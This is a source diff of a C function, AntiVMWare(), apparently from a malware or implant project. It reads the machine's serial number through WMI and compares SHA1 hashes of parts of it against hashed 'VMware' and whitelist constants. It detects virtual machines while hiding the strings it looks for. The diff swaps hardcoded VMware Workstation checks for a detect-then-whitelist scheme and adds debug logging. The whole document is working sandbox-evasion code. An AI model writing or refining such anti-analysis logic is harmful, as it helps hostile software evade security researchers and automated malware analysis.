@@ -3,9 +3,12 @@
 #include "proto.h"
 #include "antivm.h"
 
-#define VMWARE_WORKSTATION_FAIL		"\x76\x6f\x73\x08\xb2\x72\x45\x1a\x87\x51\x30\x18\xc9\x88\x7c\xaa\x60\x75\x3c\x34" // "2d 94 e0 88 ff dc f3 45" -> unicode
-#define VMWARE_WORKSTATION_FAIL2	"\x44\xb0\x73\xdc\x0d\x9d\x4c\x84\xd6\x13\x32\xe2\x70\x98\xc0\xf6\x67\x20\xe8\x0d" // "4e 60 5c 00 41 b6 4f f1 " -> unicode
+//#define VMWARE_WORKSTATION_FAIL		"\x76\x6f\x73\x08\xb2\x72\x45\x1a\x87\x51\x30\x18\xc9\x88\x7c\xaa\x60\x75\x3c\x34" // "2d 94 e0 88 ff dc f3 45" -> unicode
+//#define VMWARE_WORKSTATION_FAIL2	"\x44\xb0\x73\xdc\x0d\x9d\x4c\x84\xd6\x13\x32\xe2\x70\x98\xc0\xf6\x67\x20\xe8\x0d" // "4e 60 5c 00 41 b6 4f f1 " -> unicode
+
 #define VBOX_FAIL					"\xee\xfb\x15\x51\x37\xa9\xa2\x67\x39\x4b\x9e\x9f\xa3\x05\x5f\xf0\xde\x09\xa4\xa7" // "PCI\\VEN_80EE&DEV_CAFE"	-> unicode
+#define VMWARE_WHITELISTED			"\x83\xbe\x37\x16\x52\x97\x24\xc9\x73\xbe\x68\xbb\x0e\x46\x00\xa0\xc0\xf3\x74\x0d"  // VMware-aa aa aa aa aa aa aa aa
+#define IS_VMWARE					"\x72\x19\x78\xcf\x34\x89\x66\x34\xe1\x10\x2f\x21\xf1\x5c\x73\x96\x38\x9e\xa7\x69"  // VMware
 
 
 BOOL AntiVM()
@@ -73,22 +76,47 @@ BOOL AntiVMWare()
 			WCHAR strSerial[] = { L'S', L'e', L'r', L'i', L'a', L'l', L'N', L'u', L'm', L'b', L'e', L'r', L'\0' };
 			if (ExecQueryGetProp(pSvc, strQuery, strSerial, &vArg) && vArg.vt == VT_BSTR)
 			{
-				LPWSTR strSerial = wcsrchr(vArg.bstrVal, '-');
-				if (strSerial)
+				
+				/* 1] is it vmware? */
+
+				LPWSTR strSerial = _wcsdup(vArg.bstrVal);
+				LPWSTR strend = wcschr(strSerial, '-');
+				
+				if (strend)
 				{
-					strSerial = _wcsdup(strSerial+1);
-					
 					BYTE pSha1Buffer[20];
+					*strend = L'\0';
 					CalculateSHA1(pSha1Buffer, (LPBYTE)strSerial, wcslen(strSerial));
 
-					if (!memcmp(pSha1Buffer, VMWARE_WORKSTATION_FAIL, 20))
-						bVMWareFound = TRUE;
+					// check against sha1("VMware")
+					if (!memcmp(pSha1Buffer, IS_VMWARE, 20))
+					{
+					
+						/* 2] is it whitelisted? 
+							  whitelist has this form: VMware-aa aa aa aa aa aa aa aa-f6 0f 93 5e 27 1a a2 64
+						*/
 
-					if (!memcmp(pSha1Buffer, VMWARE_WORKSTATION_FAIL2, 20))
-						bVMWareFound = TRUE;
+						*strend = L'-';
+						strend = wcsrchr(strSerial, '-');
 
+						if (strend) // tautology, checking anyway..
+						{
+							*strend = L'\0';
+							
+							SecureZeroMemory(pSha1Buffer, 20);
+							CalculateSHA1(pSha1Buffer, (LPBYTE)strSerial, wcslen(strSerial));
+
+							// negative check against sha1("VMware - aa aa aa aa aa aa aa aa")
+							if (memcmp(pSha1Buffer, VMWARE_WHITELISTED, 20))
+								bVMWareFound = TRUE;
+						}
+
+					}
+				} // if (strend)
+
+				if (strSerial)
 					free(strSerial);
-				}
+
 			}
 			VariantClear(&vArg);
 		}
@@ -98,6 +126,12 @@ BOOL AntiVMWare()
 		pSvc->Release();
 	if (pLoc)
 		pLoc->Release();
+
+#ifdef _DEBUG
+	char out[256];
+	_snprintf_s(out, 256, _TRUNCATE, "Vmware found: %d", bVMWareFound);
+	OutputDebugStringA(out);
+#endif
 
 	return bVMWareFound;
 }
